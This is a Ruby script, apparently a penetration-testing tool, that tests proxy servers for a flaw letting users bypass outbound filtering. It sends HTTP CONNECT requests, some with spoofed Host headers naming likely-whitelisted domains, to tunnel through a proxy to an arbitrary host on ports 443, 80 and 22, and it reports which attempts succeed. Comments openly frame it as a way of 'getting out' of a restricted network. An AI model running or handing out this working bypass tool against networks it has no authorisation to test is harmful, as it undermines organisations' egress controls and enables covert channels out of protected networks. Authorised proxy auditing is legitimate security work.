require 'socket'
require 'resolv'
require 'timeout'

# Define unauthorized host and port(s)
# Note: this can be anything that has the 
# desired ports open, I use github here, 
# but it can be anything of your choosing.
web_server =  Resolv.getaddress 'github.com'
web_ports = [ 
  '443',
  '80',
  '22',
  #'<port>'
]

#Define a list of hosts likely to be whitelisted
# Note: adding more domains to this list will 
# increase your changes of getting out
domains = [
  "www.google.com",
  #"www.facebook.com",
  #"www.cnn.com",
  #"www.weather.com"
  #"<FQDN of whitelisted domain>"
]

#Define a list of proxy sockets to test for the
# vulnerable configuration.
proxy_sockets = [
 ["10.70.70.213",3128],
 #["<ip address>",<port>],
]

#A helper routine for connecting to TCP sockets quickly 
# and with reasonable/configurable timeouts
def connect_to(host, port, timeout=nil)
  addr = Socket.getaddrinfo(host, nil)
  sock = Socket.new(Socket.const_get(addr[0][0]), Socket::SOCK_STREAM, 0)
 
  if timeout
    secs = Integer(timeout)
    usecs = Integer((timeout - secs) * 1_000_000)
    optval = [secs, usecs].pack("l_2")
    sock.setsockopt Socket::SOL_SOCKET, Socket::SO_RCVTIMEO, optval
    sock.setsockopt Socket::SOL_SOCKET, Socket::SO_SNDTIMEO, optval
  end
  
  begin
    Timeout::timeout(timeout) {
      sock.connect(Socket.pack_sockaddr_in(port, addr[0][3]))
    }
    sock
  rescue
    nil
  end
end

#A helper routine for printing status results
def status(status,proxy_socket,connect_method)
  puts "[+] " +
       status + 
       ", " +
       proxy_socket[0] + 
       ":" + 
       proxy_socket[1].to_s + 
       ", " + 
       connect_method.gsub(/\r\n/,"\\r\\n")
end

#Iterate through all the combinations
web_ports.each do |web_port|
proxy_sockets.each do |proxy_socket|
  timeout = false
  
  domains.each do |domain|

    web_socket = web_server + ":" + web_port

    #Define our connect methods to try
    connect_methods = [
      "CONNECT #{web_socket} HTTP/1.1\r\n\r\n",
      "CONNECT #{web_socket} HTTP/1.0\r\n\r\n",
      "CONNECT #{web_socket} HTTP/1.1\r\nHost: #{domain}\r\n\r\n",
      "CONNECT #{web_socket} HTTP/1.0\r\nHost: #{domain}\r\n\r\n",
    ]

    connect_methods.each_with_index do |connect_method, index|
      if sock = connect_to(proxy_socket[0], proxy_socket[1], 5)
        sock.print(connect_method)
        begin
          connect_response = sock.gets()
        rescue
          status("Reset/Read Timeout",proxy_socket,connect_method)
          next
        end
        case connect_response
        when /HTTP\/\d.\d 200/i
          status("Success",proxy_socket,connect_method)
        when /HTTP\/\d.\d 403/i
          status("Forbidden",proxy_socket,connect_method)
        when /HTTP\/\d.\d 400/i
          status("Bad Request",proxy_socket,connect_method)
        when /HTTP\/\d.\d 407/i
          status("Auth Required",proxy_socket,connect_method)
        when /HTTP\/\d.\d 405/i
          status("Method Not Allowed",proxy_socket,connect_method)
        when /HTTP\/\d.\d 307/i
          status("Temporary Redirect",proxy_socket,connect_method)
        when /HTTP\/\d.\d 302/i
          status("Moved Temporarily",proxy_socket,connect_method)
        when /HTTP\/\d.\d 503/i
          status("Service Unavailable",proxy_socket,connect_method)
        else
          status("Failure",proxy_socket,connect_method)
          #puts connect_response
        end
      else
        status("Timeout",proxy_socket,connect_method)
        timeout = true
        break
      end
    end
    break if timeout
  end
end
end
